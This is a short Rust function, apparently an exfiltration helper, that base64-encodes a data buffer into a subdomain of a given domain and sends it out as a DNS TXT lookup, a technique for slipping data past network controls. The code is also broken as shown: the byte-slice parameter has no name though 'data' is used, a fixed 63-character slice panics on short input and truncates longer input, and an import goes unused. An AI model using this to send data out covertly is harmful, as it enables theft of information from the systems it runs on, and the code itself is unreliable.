use trust_dns_resolver::TokioAsyncResolver;
use std::net::UdpSocket;

pub async fn send_over_dns( &[u8], domain: &str) -> Result<(), Box<dyn std::error::Error>> {
    let resolver = TokioAsyncResolver::tokio_from_system_conf()?;
    let encoded = base64::encode_config(data, base64::URL_SAFE);

    let subdomain = format!("{}.{}", &encoded[..63], domain);
    let _ = resolver.txt_lookup(subdomain).await?;
    Ok(())
}